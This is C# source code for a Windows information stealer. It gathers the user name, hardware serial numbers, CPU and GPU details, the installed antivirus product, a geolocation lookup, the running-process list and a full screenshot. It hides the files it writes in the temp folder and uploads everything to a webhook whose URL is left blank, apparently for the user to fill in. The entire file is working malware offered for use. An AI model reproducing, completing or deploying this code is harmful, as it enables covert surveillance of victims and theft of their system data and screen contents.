using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Windows.Forms;

namespace testing1AVE
{
    class Program
    {
        private static readonly string webhook = "";
        static void Main(string[] args)
        {
            try
            {
                var iGlI = "";
                var mBd = "";
                var cpu = "";
                var gpu = "";
                var bios = "";
                var avN = "";
                var rP = "";

                // Geolocation grabber
                var wc = new WebClient();
                var information = wc.DownloadString("LINK_HERE"); // Make sure you add a link, or the process will fail.
                information = information.Replace("<br>", Environment.NewLine);
                iGlI = information;

                // Grabs PC information
                var cUser = "User: " + Environment.UserName;

                foreach (var queryObj in new ManagementObjectSearcher(new SelectQuery("Win32_BaseBoard")).Get())
                    mBd = "(MB) Serial Number: " + queryObj.Properties["SerialNumber"].Value.ToString();

                foreach (var managObj in new ManagementClass("win32_processor").GetInstances())
                    cpu = "(CPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(CPU) Cores: " + managObj.Properties["NumberOfCores"].Value.ToString();

                using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
                {
                    foreach (var managObj in searcher.Get())
                        gpu = "(GPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(GPU) Version: " + managObj.Properties["DriverVersion"].Value.ToString();
                }

                foreach (var managObj in new ManagementClass("Win32_BIOS").GetInstances())
                    bios = "Serial Number (BIOS): " + managObj.Properties["SerialNumber"].Value.ToString();

                string pathS = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (var searcher = new ManagementObjectSearcher(pathS, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var instance in searcher.Get())
                    {
                        instance.GetPropertyValue("displayName");
                        avN = instance.GetPropertyValue("displayName").ToString();
                    }
                    if (avN == "") avN = "N/a";
                }

                // Current process activities
                foreach (var proc in Process.GetProcesses())
                    rP = rP + proc.ProcessName + Environment.NewLine;

                if (!File.Exists(Path.GetTempPath() + "Proccesses.txt"))
                {
                    using (var file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
                        file.WriteLine(rP);
                }
                else
                {
                    File.Delete(Path.GetTempPath() + "Proccesses.txt");
                    using (var file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
                        file.WriteLine(rP);
                }

                var attr = File.GetAttributes(Path.GetTempPath() + "Proccesses.txt");
                if ((attr & FileAttributes.Hidden) != FileAttributes.Hidden)
                    File.SetAttributes(Path.GetTempPath() + "Proccesses.txt", FileAttributes.Hidden);

                // Screenshot
                var b = Screen.GetBounds(Point.Empty);
                using (var bitmap = new Bitmap(b.Width, b.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                        g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);

                    bitmap.Save(Path.GetTempPath() + "Screen.jpg", ImageFormat.Jpeg);
                    File.SetAttributes(Path.GetTempPath() + "Screen.jpg", FileAttributes.Hidden);
                }

                // Sends logged information to a webhook
                wc.UploadValues(webhook, new System.Collections.Specialized.NameValueCollection()
                {
                    {
                            "username",
                            "Logs"
                    },
                    {
                            "content",
                            $">>> -----GeoLocation Info-----{Environment.NewLine + iGlI + Environment.NewLine + Environment.NewLine}-----PC Info-----{Environment.NewLine + cUser + Environment.NewLine + mBd + Environment.NewLine + cpu + Environment.NewLine + gpu + Environment.NewLine + bios + Environment.NewLine + avN}"
                    }
                });
                wc.UploadFile(webhook, Path.GetTempPath() + "Proccesses.txt");
                wc.UploadFile(webhook, Path.GetTempPath() + "Screen.jpg");
                wc.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }
    }
}
